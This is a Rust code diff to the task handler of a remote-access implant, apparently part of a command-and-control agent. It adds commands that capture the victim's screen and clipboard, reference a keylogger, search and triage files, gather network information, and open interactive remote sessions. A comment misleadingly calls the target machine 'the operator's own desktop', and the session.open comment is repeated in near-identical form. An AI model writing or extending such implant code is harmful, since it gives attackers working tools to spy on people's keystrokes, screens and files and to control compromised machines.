@@ -310,6 +310,18 @@ pub struct Context {
     pub verbose: bool,
 }
 
+/// Read an argument that may arrive as text or as bytes.
+///
+/// The console sends a line of text, a script sends raw bytes, and the
+/// implant does not care which one it got.
+fn arg_bytes(args: &Value, key: &str) -> Vec<u8> {
+    match args.get(key) {
+        Some(Value::Bin(data)) => data.clone(),
+        Some(Value::Str(text)) => text.as_bytes().to_vec(),
+        _ => Vec::new(),
+    }
+}
+
 /// Execute one task. `sleep`/`exit` are handled by the beacon loop itself, so
 /// they are only reported here for completeness.
 pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
@@ -397,6 +409,61 @@ pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
             Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
             Err(e) => Outcome::err(1, e),
         },
+
+        // ---- the operator's own desktop ---------------------------------
+        "screenshot" => match crate::desktop::screen() {
+            Ok(data) => Outcome::ok(data).with("format", upk::s("bmp")),
+            Err(e) => Outcome::err(1, e),
+        },
+        "clipboard" => match crate::desktop::clipboard() {
+            Ok(text) => Outcome::ok(text.into_bytes()),
+            Err(e) => Outcome::err(1, e),
+        },
+        // The key logger is started by the beacon itself: it streams the
+        // keys while it runs, exactly like an interactive session does.
+        "keylog" => Outcome::err(2, "the key logger is started by the beacon itself"),
+
+        // ---- files and the network --------------------------------------
+        "triage" => {
+            let path = args.str_or("path", "");
+            match crate::triage::triage(&path) {
+                Ok(out) => Outcome::ok(out.into_bytes()),
+                Err(e) => Outcome::err(1, e),
+            }
+        }
+        "find" => {
+            let root = args.str_or("path", ".");
+            let name = args.str_or("name", "");
+            let content = args.str_or("content", "");
+            let max = args.u64_or("max", 500) as usize;
+            match crate::triage::find(&root, &name, &content, max) {
+                Ok(out) => Outcome::ok(out.into_bytes()),
+                Err(e) => Outcome::err(1, e),
+            }
+        }
+        "netinfo" => Outcome::ok(crate::netinfo::report().into_bytes()),
+
+        // ---- interactive sessions ---------------------------------------
+        // `session.open` is handled by the beacon itself: the session has to
+        // outlive the task that opened it, so the beacon keeps the stream
+        // and sends the output as it arrives.
+        // `session.open` is started by the beacon itself: the session has to
+        // outlive the task that opened it.
+        "session.open" => Outcome::err(2, "the session is started by the beacon itself"),
+        "session.input" => {
+            let id = args.str_or("session", "");
+            match crate::sessions::input(&id, &arg_bytes(args, "data")) {
+                Ok(()) => Outcome::ok(Vec::new()).with("session", upk::s(&id)),
+                Err(e) => Outcome::err(1, e),
+            }
+        }
+        "session.close" => {
+            let id = args.str_or("session", "");
+            match crate::sessions::close(&id) {
+                Ok(()) => Outcome::ok(Vec::new()).with("session", upk::s(&id)),
+                Err(e) => Outcome::err(1, e),
+            }
+        }
 
         // ---- layer-3 tunnel ---------------------------------------------
         "vpn" => start_vpn(ctx, args),
